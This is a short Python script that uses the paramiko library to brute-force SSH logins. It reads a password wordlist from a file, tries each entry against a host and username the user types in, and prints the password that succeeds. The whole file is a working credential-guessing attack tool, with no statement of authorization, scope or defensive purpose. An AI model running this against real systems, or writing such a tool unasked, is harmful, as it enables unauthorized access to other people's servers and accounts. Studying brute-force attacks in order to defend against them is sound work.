import paramiko

def brute_force_ssh(host, username, password_list):
    """Brute force SSH login."""
    for password in password_list:
        try:
            # SSH connection attempt
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password)
            print(f"Success! Username: {username} | Password: {password}")
            ssh.close()
            return password  # Found the correct password
        except paramiko.AuthenticationException:
            print(f"Failed login attempt with {password}")
        except Exception as e:
            print(f"Error: {e}")
            break
    return None

if __name__ == "__main__":
    host = input("Enter the host or IP address: ")
    username = input("Enter the username: ")

    # Read passwords from a wordlist
    with open('wordlists/passwords.txt', 'r') as file:
        passwords = file.readlines()

    brute_force_ssh(host, username, [pwd.strip() for pwd in passwords])